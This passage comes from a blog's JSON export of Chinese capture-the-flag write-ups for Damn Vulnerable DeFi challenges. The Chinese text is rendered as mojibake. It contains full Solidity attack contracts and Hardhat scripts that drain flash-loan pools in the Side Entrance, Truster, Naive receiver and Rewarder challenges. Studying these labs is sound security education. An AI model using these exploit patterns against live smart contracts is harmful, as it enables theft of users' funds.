å‡½æ•°çš„å£°æ˜æœ‰è§£é‡Š The `from` account must have at least `amount` approved for */ damnValuableToken.approve(address(rewarderPool), amount); // å…ˆæ‰§è¡Œå­˜é’±æ“ä½œï¼Œé‡Œé¢æ‰§è¡Œäº†è·åˆ©å‡½æ•°ï¼Œæ­¤æ—¶ balance(RewardHack) = amount + rewards // æ­¤æ—¶ amount åœ¨ TheRewarderPool ï¼Œè€Œ rewards åœ¨ RewardHack ä¸­ rewarderPool.deposit(amount); // æŠŠå­˜çš„é’±ï¼ˆamountï¼‰å–å‡ºæ¥, amount åœ¨ RewardHack ä¸­ rewarderPool.withdraw(amount); // è¦é€šè¿‡ TheRewarderPoolè´¦æˆ· å°† rewards è½¬ç»™ RewardHack rewardToken.transfer(player, rewardToken.balanceOf(address(this))); // è¿˜è´· damnValuableToken.transfer(address(flashLoanpool), amount); // å°† TheRewarderPool ä¸­çš„rewardså…¨éƒ¨è½¬ç»™æˆ‘ï¼ˆplayerï¼‰ damnValuableToken.transfer(player, rewardToken.balanceOf(address(this))); &#125; function attack(uint256 amount) external &#123; /** æ‰§è¡Œå€Ÿè´·æ“ä½œï¼š å¯¹ RewardHack å‡½æ•°æ¥è¯´ï¼Œmsg.sender æ˜¯æˆ‘ï¼Œå¯¹ FlashLoanerPool æ¥è¯´msg.sender æ˜¯ RewardHackï¼› åœ¨æ‰§è¡Œ `liquidityToken.transfer(msg.sender, amount)`æ—¶ï¼Œ é‡‘åº“ damnValuableToken æ˜¯ç»™ RewardHack è½¬è´¦ */ flashLoanpool.flashLoan(amount); &#125;&#125; 3.2 challenge.js12345678it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const attacker = await(await ethers.getContractFactory(&#x27;RewardHack&#x27;, player)).deploy( liquidityToken.address, flashLoanPool.address, rewarderPool.address, rewardToken.address ); await ethers.provider.send(&quot;evm_increaseTime&quot;, [5 * 24 * 60 * 60]); await attacker.attack(TOKENS_IN_LENDER_POOL);&#125;); 3.3 above all è¿™ä¸ªchallenge çš„ msg.senderçœŸçš„å¾ˆç»ï¼Œè‡³å°‘è¿™æ˜¯æˆ‘ç›®å‰é‡åˆ°çš„æœ€ç»•çš„ä¸€ä¸ªã€‚ ç†è§£å¥½ msg.sender ï¼Œå…¶å®ä¹Ÿè¿˜è¡Œã€‚","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Side Entrance","slug":"CTFS/damn defi/Side Entrance","date":"2023-07-10T09:37:10.000Z","updated":"2023-07-10T09:37:10.000Z","comments":true,"path":"2023/07/10/CTFS/damn defi/Side Entrance/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/10/CTFS/damn%20defi/Side%20Entrance/","excerpt":"","text":"1. issue A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time. It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system. Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool. æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯ï¼Œå‡­å€Ÿæ‰‹é‡Œçš„1 ether å°† poolçš„é’±å…¨éƒ¨å–å‡ºæ¥ã€‚ é¢˜ç›®é“¾æ¥ 2. analysingè§‚å¯Ÿåˆçº¦å¯çŸ¥ï¼Œé‡Œé¢æœ‰ä¸‰ä¸ªå‡½æ•°ï¼Œåˆ†åˆ«æ˜¯ deposit(),withdraw(),falshLoan()ã€‚ æˆ‘çš„ç¬¬ä¸€ååº”æ˜¯ä½¿ç”¨è‡ªæ¯å‡½æ•°ï¼Œä½†æ˜¯ï¼Œåˆ†ææ‰å‘ç°ï¼Œè‡ªæ¯æ“ä½œåªä¼šæ¯æ‰è‡ªå·±æ‰€åœ¨åˆçº¦ï¼Œä¸ä¼šå¯¹å…¶ä»–åˆçº¦äº§ç”Ÿå½±å“ã€‚ æ‰€ä»¥åªèƒ½å°†ç›®å…‰çœ‹åˆ°ï¼Œå–æ¬¾æ“ä½œã€‚ withdraw()ï¼š 12345678function withdraw() external &#123; uint256 amount = balances[msg.sender]; delete balances[msg.sender]; emit Withdraw(msg.sender, amount); SafeTransferLib.safeTransferETH(msg.sender, amount);&#125; åˆ†æä¸éš¾çœ‹å‡ºï¼Œæˆ‘ä»¬åªèƒ½å– mapping balanceä¸­æ‰€è®°å½•çš„é‡‘é¢å¤§å°ã€‚é‚£æˆ‘ä»¬çœ‹åˆ°å­˜æ¬¾æ“ä½œã€‚ deposit(): 123456function deposit() external payable &#123; unchecked &#123; balances[msg.sender] += msg.value; &#125; emit Deposit(msg.sender, msg.value);&#125; emmmmmï¼Œåˆ†æå¯çŸ¥ï¼Œåªèƒ½å­˜å¤šå°‘è®°å½•å¤šå°‘ï¼Œçœ‹äº†çœ‹è‡ªå·±æ‰‹ä¸­çš„ 1 etherâ€¦â€¦â€¦è¿˜æ˜¯ç»§ç»­å¾€ä¸‹çœ‹å§ã€‚ falshLoan() 12345678function flashLoan(uint256 amount) external &#123; uint256 balanceBefore = address(this).balance; IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;(); if (address(this).balance &lt; balanceBefore) revert RepayFailed();&#125; å—¯å“¼ï¼Ÿçœ‹èµ·æ¥å¾ˆç®€å•ï¼Œå…ˆç»™msg.senderè½¬ amountæ•°ç›®çš„é’±ï¼Œå†æ‰§è¡Œ executeå‡½æ•°ã€‚ åˆå› ä¸ºï¼Œexecuteå‡½æ•°å®šä¹‰åœ¨æ¥å£ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰è¯¥å‡½æ•°ï¼Œç”±çŸ¥é“è¯¥æ“ä½œæ˜¯å…ˆç»™æˆ‘ä»¬é’±ï¼Œå†è®©æˆ‘ä»¬å»æ‰§è¡Œ executeï¼Œé‚£å°±å¾ˆç®€å•äº†ï¼Œæˆ‘ä»¬å¯ä»¥é‚£è¿™ amountæ•°ç›®çš„é’±æ‹¿å»å­˜ï¼Œå­˜åœ¨è¯¥åˆçº¦ä¸­ï¼Œåˆ°æ—¶å€™ ä¸€å®šä¼šæ»¡è¶³address(this).balance &lt; balanceBeforeè¯¥æ¡ä»¶ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥åœ¨ msg.sender çš„åä¹‰ä¸‹å­˜æ¬¾ï¼Œå½“ç„¶ msg.sender å°±å¯ä»¥ä» å€Ÿè´·æ± å–æ¬¾äº†ï¼Œå±äºæ˜¯ç©ºæ‰‹å¥—ç™½ç‹¼äº†ã€‚ æ³¨æ„ï¼š æœ¬é¢˜ä¹Ÿæ²¡é‚£ä¹ˆç®€å•ï¼Œæƒ³åˆ°äº†æ€è·¯å®ç°èµ·æ¥è¿˜æ˜¯æœ‰ç‚¹ç»†èŠ‚çš„ã€‚æ¯”å¦‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ¥å£çš„çŸ¥è¯†ï¼Œè‡ªå®šä¹‰ä¸€ä¸ªæ¥å£ï¼Œé‚£ä¹ˆæ­¤æ—¶ IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;()ä¸­çš„ msg.senderä¸€å®šå¾—æ˜¯ï¼Œè‡ªå®šä¹‰ executeå‡½æ•°çš„åˆçº¦åœ°å€ï¼ˆæˆ‘çš„æ°´å¹³æœ‰é™ï¼Œä¸èƒ½é©¬ä¸Šç†æ¸…å±‚å±‚è°ƒç”¨çš„ msg.sender æ˜¯è°ï¼‰ã€‚ æˆ‘çš„ç†è§£æ˜¯ï¼šå¤–éƒ¨è´¦æˆ·ï¼ˆplayerï¼‰åœ¨å®ç°äº†execteå‡½æ•°çš„åˆçº¦ï¼ˆSideEntranceHackï¼‰ä¸­ï¼Œé€šè¿‡poolè°ƒç”¨poolä¸­çš„ falshLoanå‡½æ•°ï¼Œæ­¤æ—¶å¯¹äºSideEntranceHackåˆçº¦æ¥è¯´msg.senderæ˜¯å¤–éƒ¨è´¦æˆ·ï¼Œå¯¹äºæ“ä½œpoolæ¥è¯´ï¼Œpoolçš„msg.senderå°±æ˜¯address(SideEntranceHack)ã€‚ æ‰€ä»¥ï¼Œæˆ‘ä»¬ä¸ç®¡æ€ä¹ˆå¼„ï¼Œéƒ½ä¸èƒ½ä»¥ player ä¸º msg.sender æ¥è°ƒç”¨ withdraw å‡½æ•°ã€‚ 3. solvingå…ˆå†™æ”»å‡»åˆçº¦ 123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./SideEntranceLenderPool.sol&quot;;contract SideEntranceHack &#123; SideEntranceLenderPool pool; address payable owner; constructor(address _addr) &#123; owner = payable(msg.sender); pool = SideEntranceLenderPool(_addr); &#125; function execute() external payable&#123; pool.deposit&#123;value: 1000 ether&#125;(); &#125; function attack(uint amount) public &#123; pool.flashLoan(amount); pool.withdraw(); &#125; receive () external payable &#123; owner.transfer(address(this).balance); &#125;&#125; æ”»å‡»æ€è·¯ï¼Œå…ˆåˆ©ç”¨ å€Ÿè´·æ± å€Ÿç»™æˆ‘çš„ 1000 ethersï¼Œä»¥ attacker çš„åä¹‰å­˜é’±ï¼Œå†ä»¥ attacker çš„åä¹‰å–é’±ï¼Œæœ€åå°†é’±è½¬å‘è‡³ playerçš„è´¦æˆ·ã€‚ jsé¢˜è§£ 12345it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const attacter = await (await ethers.getContractFactory(&#x27;SideEntranceHack&#x27;, player)).deploy(pool.address); await attacter.attack(ETHER_IN_POOL); &#125;); è§£é¢˜æˆåŠŸ","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Truster","slug":"CTFS/damn defi/Truster","date":"2023-07-10T03:37:10.000Z","updated":"2023-07-10T03:37:10.000Z","comments":true,"path":"2023/07/10/CTFS/damn defi/Truster/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/10/CTFS/damn%20defi/Truster/","excerpt":"","text":"1. issue More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free. The pool holds 1 million DVT tokens. You have nothing. To pass this challenge, take all tokens out of the pool. If possible, in a single transaction. ç›®æ ‡ï¼šèº«æ— åˆ†æ–‡çš„ä½ è¦å°†å€Ÿè´·æ± çš„é’±å…¨å–å‡ºæ¥ã€‚ é¢˜ç›®é“¾æ¥ 2. analysing2.1 å¯»æ‰¾balanceæ˜¯ä»€ä¹ˆ é€šè¿‡ä½¿ç”¨ethers.provider.getBalance()æŸ¥è¯¢ pool.addressçš„balanceå¯ä»¥çœ‹åˆ°ä¸º 0ï¼Œ ä½†æ˜¯é€šè¿‡token.balanceOf()å¯ä»¥æŸ¥çœ‹åˆ° balanceä¸º 1000000 etherã€‚æ‰€ä»¥ï¼Œé¢˜ç›®æ‰€è¦å€Ÿå…‰çš„æ˜¯ ERC20 tokenï¼Œè¦æƒ³å¯¹tokençš„å€¼åŠ¨æ‰‹ï¼Œåªèƒ½è°ƒç”¨ ERC20 ä¸‹çš„ è½¬è´¦æ“ä½œï¼Œæ¯”å¦‚transfer(), transferFrom()ã€‚ 2.2 TrusterLenderPool.solåˆ†æflashLoanå‡½æ•° 1234567891011121314151617function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external nonReentrant returns (bool)&#123; // è®°å½•å½“å‰å€Ÿè´·æ± çš„ balance uint256 balanceBefore = token.balanceOf(address(this)); // ä»–è¿™é‡Œæ˜¯ä» token ä¸­ç»™ ç”¨æˆ·è´·æ¬¾ï¼Œä¸æ¶‰åŠå€Ÿè´·æ± æœ¬èº«ï¼Ÿ token.transfer(borrower, amount); // ç»†è¯» `functionCall` target.functionCall(data); if (token.balanceOf(address(this)) &lt; balanceBefore) revert RepayFailed(); return true; flashLoanå†™çš„å¾ˆç®€å•ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œtoken.transfer(borrower, amount) çœ‹åˆ°æ˜¯tokenç»™borrowerè½¬è´¦ï¼Œè¿™é‡Œè¦å¼•èµ·æ³¨æ„ï¼›target.functionCall(data);è¿™è¡Œä»£ç éœ€è¦å±‚å±‚è¿½è¸ªæ‰å¯ä»¥å‘ç°é‡Œé¢çš„æ–°å¤©åœ°ã€‚ è§£è¯»functionCall: å¯¹dataè¿›è¡Œè¿½è¸ªï¼Œå‘ç°æ˜¯functionCallWithValueåœ¨è¢«ä½¿ç”¨çš„ 123456789101112function functionCallWithValue( address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) &#123; require(address(this).balance &gt;= value, &quot;Address: insufficient balance for call&quot;); require(isContract(target), &quot;Address: call to non-contract&quot;); (bool success, bytes memory returndata) = target.call&#123;value: value&#125;(data); return verifyCallResult(success, returndata, errorMessage);&#125; (bool success, bytes memory returndata) = target.call&#123;value: value&#125;(data);ä¸­ï¼Œæœ‰ dataï¼Œè¿™è¡Œä»£ç å…¶å®æ˜¯åœ¨è°ƒç”¨å‡½æ•°ï¼Œè€Œå‡½æ•°å°±æ˜¯è¢«ç¼–è¯‘æˆä¸ºå­—èŠ‚ç çš„ dataï¼Œæ‰€ä»¥ targetå°±ç†æ‰€åº”å½“æ˜¯åŒ…å« dataå‡½æ•°çš„åˆçº¦åœ°å€ã€‚ å†è¿›ä¸€æ­¥åˆ†æï¼Œæˆ‘ä»¬çš„åˆè¡·æ˜¯æ”¹å˜ balanceï¼Œèƒ½æ”¹å˜balanceçš„åªæœ‰ è½¬è´¦æ“ä½œï¼Œä¸€ç§æ˜¯ ä½¿ç”¨ transferå¦ä¸€ç§ä¸­æ˜¯transferFrom å¦‚æœä½¿ç”¨transfer 12345678910111213function transfer(address to, uint256 amount) public virtual returns (bool) &#123; balanceOf[msg.sender] -= amount; // Cannot overflow because the sum of all user // balances can&#x27;t exceed the max uint256 value. unchecked &#123; balanceOf[to] += amount; &#125; emit Transfer(msg.sender, to, amount); return true;&#125; è¦ç¬¦åˆé¢˜æ„æ—¢è¦æŠŠpoolçš„é’±èŠ±å…‰ï¼Œè¿˜è¦ç»™play.addressåœ°å€è½¬å…¥ä¸€ç™¾ä¸‡etherï¼Œä½¿ç”¨ transferèƒ½æ»¡è¶³åè€…ï¼Œä½†ä¸èƒ½æ»¡è¶³å‰ä¸€ä¸ªæ¡ä»¶ 12let attackToken1 = token.connect(deployer); await attackToken1.transfer(player.address,TOKENS_IN_POOL)ï¼› æ‰€ä»¥åªèƒ½ä½¿ç”¨ transferFrom å¦‚æœä½¿ç”¨ transferFrom 123456789101112131415161718192021function transferFrom( address from, address to, uint256 amount) public virtual returns (bool) &#123; uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals. if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount; balanceOf[from] -= amount; // Cannot overflow because the sum of all user // balances can&#x27;t exceed the max uint256 value. unchecked &#123; balanceOf[to] += amount; &#125; emit Transfer(from, to, amount); return true;&#125; åªè¦æˆ‘ä»¬èƒ½å¤Ÿå°†transferFromå‡½æ•°æˆåŠŸè°ƒç”¨ï¼Œå°±å¯ä»¥è§£å†³é—®é¢˜äº†ã€‚fromçš„å€¼ä¸ºpool.address, toçš„å€¼ä¸ºplayer.addressã€‚èƒ½æ‰§è¡Œæ“ä½œ 1000000ether å°± å¿…é¡»è®© pool.address ç»™ play.address approve 1000000etherçš„æ“ä½œæƒé™ã€‚ æ‰€ä»¥ï¼Œdataçš„å€¼å°±æ˜¯ transferFrom çš„å­—èŠ‚ç ã€‚ approveå‡½æ•° 1234567function approve(address spender, uint256 amount) public virtual returns (bool) &#123; allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true;&#125; ç”±callçš„ä½¿ç”¨åŸç†å¯çŸ¥ï¼Œmsg.senderå°±æ˜¯ poolçš„åˆçº¦åœ°å€ã€‚ 3. solving3.1 TrusterHack.sol12345678910111213141516// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./TrusterLenderPool.sol&quot;;import &quot;../DamnValuableToken.sol&quot;;contract TrusterHack &#123; function attack(address _pool, address _recevier, address _token) external &#123; // é€šè¿‡poolåœ°å€ï¼Œç»™ç©å®¶åœ°å€æˆæƒ bytes memory func_abi = abi.encodeWithSignature(&quot;approve(address,uint256)&quot;, _recevier, 1000000 ether); // è°ƒç”¨flashLoan TrusterLenderPool(_pool).flashLoan(0, _recevier, _token, func_abi); // DamnValuableToken(_token).transferFrom(_pool, _recevier, 1000000 ether); &#125;&#125; æ³¨æ„ï¼šåœ¨åˆçº¦ä¸­æ˜¯ä¸èƒ½è°ƒç”¨transferFromå‡½æ•°çš„ï¼Œå› ä¸ºä½ ä¸èƒ½å°†ä»»æ„ä¸€ä¸ªåœ°å€å¼ºè½¬æˆERC20ç±»å‹ï¼Œç„¶åè°ƒç”¨å…¶ä¸­çš„æ–¹æ³•ï¼ˆä¸ªäººç†è§£ï¼‰ 3.2 challenge.js1234567it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const attacker = await (await ethers.getContractFactory(&#x27;TrusterHack&#x27;, player)).deploy(); let attackToken = token.connect(player); await attacker.attack(pool.address, player.address, token.address); await attackToken.transferFrom(pool.address, player.address,TOKENS_IN_POOL);&#125;); è§£é¢˜æˆåŠŸ~ è¿˜æœ‰å¦ä¸€ç§è§£é¢˜æ–¹å¼ï¼Œé€šè¿‡etherjs æ¥è§£é¢˜çš„ï¼ŒåŸç†éƒ½ä¸€æ ·ï¼Œå®ç°çš„æ–¹æ³•ä¸åŒ: æ–¹æ³•äºŒ","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Naive receiver","slug":"CTFS/damn defi/Naive receiver","date":"2023-07-09T07:37:10.000Z","updated":"2023-07-09T07:37:10.000Z","comments":true,"path":"2023/07/09/CTFS/damn defi/Naive receiver/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/09/CTFS/damn%20defi/Naive%20receiver/","excerpt":"","text":"1. issue Thereâ€™s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH. A user has deployed a contract with 10 ETH in balance. Itâ€™s capable of interacting with the pool and receiving flash loans of ETH. Take all ETH out of the userâ€™s contract. If possible, in a single transaction. ç®€å•æ¥è¯´ï¼Œå°±æ˜¯è¦å°†è´·æ¬¾äººæ‰‹ä¸­çš„é’±å˜æˆ 0ã€‚ é¢˜ç›®é“¾æ¥ 2. analysing2.1 FlashLoanReceiver.sol123456789101112131415161718192021222324252627282930function onFlashLoan( address, address token, uint256 amount, uint256 fee, bytes calldata ) external returns (bytes32) &#123; assembly &#123; // gas savings if iszero(eq(sload(pool.slot), caller())) &#123; mstore(0x00, 0x48f5c3ed) revert(0x1c, 0x04) &#125; &#125; if (token != ETH) revert UnsupportedCurrency(); uint256 amountToBeRepaid; // è®¡ç®—å¸¦å¿è¿˜é‡‘é¢ unchecked &#123; amountToBeRepaid = amount + fee; &#125; _executeActionDuringFlashLoan(); // Return funds to pool ==ã€‹ å‘å€Ÿè´·æ± è¿˜é’± SafeTransferLib.safeTransferETH(pool, amountToBeRepaid); return keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;); &#125; è§£è¯»ï¼š è´·æ¬¾äººè¿˜æ¬¾çš„æ“ä½œï¼Œè¿˜æ¬¾ &#x3D; è´·æ¬¾æ•°ç›® + æ‰‹ç»­è´¹ 2.2 NaiveReceiverLenderPool.sol123456789101112131415161718192021222324252627282930313233/** é—ªç”µè´·å‡½æ•° */ function flashLoan( IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data ) external returns (bool) &#123; // receiver çš„ ETH ç›¸å¯¹åº” if (token != ETH) revert UnsupportedCurrency(); // å½“å‰åˆçº¦çš„ balance uint256 balanceBefore = address(this).balance; // å‘ receiver è½¬ amount æ•°ç›®çš„é‡‘é¢ // Transfer ETH and handle control to receiver SafeTransferLib.safeTransferETH(address(receiver), amount); if(receiver.onFlashLoan( msg.sender, ETH, amount, FIXED_FEE, data ) != CALLBACK_SUCCESS) &#123; revert CallbackFailed(); &#125; if (address(this).balance &lt; balanceBefore + FIXED_FEE) revert RepayFailed(); return true; &#125; è§£è¯»ï¼š å€Ÿè´·æ±  é—ªç”µè´·å‡½æ•°ï¼Œè´·æ¬¾å’Œè¿˜æ¬¾åœ¨åŒä¸€ç¬”äº¤æ˜“ä¸­ï¼Œä¿è¯ è´·æ¬¾äººè¿˜æ¬¾ä¹‹åçš„é‡‘é¢å¤§äºæœªè´·æ¬¾çš„é‡‘é¢ã€‚ 3. solvingæ˜“çŸ¥ï¼Œæ¯ä¸€ç¬”è´·æ¬¾éƒ½éœ€è¦ç¼´çº³ 1etherçš„æ‰‹ç»­è´¹ï¼Œè€Œç”¨æˆ·åªæœ‰ 10etherï¼ŒæŒ‰ç†æ¥è¯´åªè¦è¿›è¡Œåæ¬¡å€Ÿè´·æ“ä½œå°±å¯ä»¥å°†ç”¨æˆ·æ‰‹ä¸­çš„10ä¸ªetherèŠ±å…‰ã€‚å¦‚ä¸‹ï¼š 1234567 it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ let ETH = await pool.ETH()ï¼› for (let i = 0; i &lt; 10; i++) &#123; await pool.flashLoan(receiver.address, ETH, 0, &quot;0x&quot;); &#125;&#125;); è¿™æ ·ï¼Œçš„ç»“æœä¹Ÿæ˜¯æ­£ç¡®çš„ ä½†æ˜¯ï¼Œé¢˜ç›®è¦æ±‚åœ¨ä¸€ç¬”äº¤æ˜“ä¸­å®Œæˆï¼Œé‚£å°±å¾ˆç®€å•äº†ï¼Œå°†è¿™10æ¬¡è°ƒç”¨æ”¾åœ¨ä¸€ä¸ªåˆçº¦ä¸­å³å¯ã€‚ Hack.sol: 1234567891011121314151617181920// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./FlashLoanReceiver.sol&quot;;import &quot;./NaiveReceiverLenderPool.sol&quot;;contract Hack &#123; address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE; function attack(address payable _pool, address payable _receiver) external &#123; for (uint256 i = 0; i &lt; 10; i++) &#123; NaiveReceiverLenderPool(_pool).flashLoan( IERC3156FlashBorrower(_receiver), ETH, 0 ether, &quot;&quot; ); &#125; &#125;&#125; naive-receiver.challenge.js 123456it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const AttractContract = await ethers.getContractFactory(&#x27;Hack&#x27;, player); const attracter = await AttractContract.deploy(); await attracter.attack(pool.address, receiver.address); &#125;); è¿è¡Œç»“æœï¼š è§£é¢˜æˆåŠŸã€‚","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"","slug":"CTFS/damn defi/ABI Smuggling","date":"2023-07-09T03:37:10.000Z","updated":"2023-07-09T03:37:10.000Z","comments":true,"path":"2023/07/09/CTFS/damn defi/ABI Smuggling/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/09/CTFS/damn%20defi/ABI%20Smuggling/","excerpt":"","text":"1. issue2. analysing3. solving","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"","slug":"CTFS/damn defi/Puppet V3","date":"2023-07-09T03:37:10.000Z","updated":"2023-07-09T03:37:10.000Z","comments":true,"path":"2023/07/09/CTFS/damn defi/Puppet V3/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/09/CTFS/damn%20defi/Puppet%20V3/","excerpt":"","text":"1. issue2. analysing3. solving","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Unstoppable","slug":"CTFS/damn defi/Unstoppable","date":"2023-07-09T03:37:10.000Z","updated":"2023-07-09T03:37:10.000Z","comments":true,"path":"2023/07/09/CTFS/damn defi/Unstoppable/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/09/CTFS/damn%20defi/Unstoppable/","excerpt":"","text":"1. issue Thereâ€™s a tokenized vault with a million DVT tokens deposited. Itâ€™s offering flash loans for free, until the grace period ends. To pass the challenge, make the vault stop offering flash loans. You start with 10 DVT tokens in balance. ç®€å•æ¥è¯´ï¼šå°±æ˜¯è®©è¿™ä¸ªé‡‘åº“åœæ­¢æä¾›é—ªç”µè´· é¢˜ç›®é“¾æ¥ 2.analysingReceiverUnstoppable.sol å’Œ UnstoppableVault.sol æºç é“¾æ¥ ç”±ç®€å…¥éš¾ åˆ†æReceiverUnstoppable.sol: 1234567891011121314function onFlashLoan( address initiator, address token, uint256 amount, uint256 fee, bytes calldata) external returns (bytes32) &#123; if (initiator != address(this) || msg.sender != address(pool) || token != address(pool.asset()) || fee != 0) revert UnexpectedFlashLoan(); ERC20(token).approve(address(pool), amount); return keccak256(&quot;IERC3156FlashBorrower.onFlashLoan&quot;);&#125; ERC20(token).approve(address(pool), amount): ERC20åº•å±‚ä»£å¸ç»™UnstoppableVaulté‡‘åº“æˆæƒï¼Œå…è®¸é‡‘åº“æ”¯é…å¤šå°‘æ•°é‡çš„é‡‘é¢ 123456789function executeFlashLoan(uint256 amount) external onlyOwner &#123; address asset = address(pool.asset()); pool.flashLoan( this, asset, amount, bytes(&quot;&quot;) );&#125; è°ƒç”¨ UnstoppableVaultçš„flashLoanå‡½æ•° åˆ†æUnstoppableVault.sol: 12345678910111213141516171819202122232425262728293031function flashLoan( IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data) external returns (bool) &#123; // è´·æ¬¾æ•°ç›®ä¸èƒ½ä¸º0 if (amount == 0) revert InvalidAmount(0); // fail early // è¦é‡‘åº“åº”ä¸ºå½“å‰é‡‘åº“ if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement // balanceBefore = balanceOf(address(this)) =&gt; address(this)=vault uint256 balanceBefore = totalAssets(); // ä¿é™©åº“çš„æ€»é‡‘é¢ // totalSupply æ˜¯é“¸å¸æ˜¯èµ‹å€¼ åˆå§‹å€¼ = balanceOf(vault) if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement uint256 fee = flashFee(_token, amount); // transfer tokens out + execute callback on receiver ERC20(_token).safeTransfer(address(receiver), amount); // callback must return magic value, otherwise assume it failed if (receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data) != keccak256(&quot;IERC3156FlashBorrower.onFlashLoan&quot;)) revert CallbackFailed(); // pull amount + fee from receiver, then pay the fee to the recipient ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee); ERC20(_token).safeTransfer(feeRecipient, fee); return true;&#125; è¦ä½¿æ•´ä¸ªå€Ÿè´·æ± å´©æºƒå¾ˆç®€å•ï¼Œå°±æ˜¯å°†è¿™ä¸ªå€Ÿè´·å‡½æ•°å¼„åï¼ˆå³æ— æ³•è°ƒç”¨ï¼‰ï¼Œåˆ†æå¯çŸ¥ï¼Œåªæœ‰if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();è¯¥æ¡è¯­å¥æ‰èƒ½å°†å€Ÿè´·å‡½æ•°åœ¨åº•å±‚å°†å…¶ç ´åï¼Œä¸å—è°ƒç”¨è€…è¾“å…¥å‚æ•°æ‰€å½±å“ã€‚ è¿›ä¸€æ­¥åˆ†æï¼š balanceBeforeæ˜¯é€šè¿‡è°ƒç”¨ totalAssets() å‡½æ•°å¾—æ¥çš„ï¼Œè€Œ totalAssets() å°±æ˜¯å°†å½“å‰å€Ÿè´·æ± çš„ä½™é¢è¿”å›ï¼ˆä¼šå—åˆ°äº¤æ˜“çš„å½±å“ï¼‰ï¼Œè€Œ totalSupply 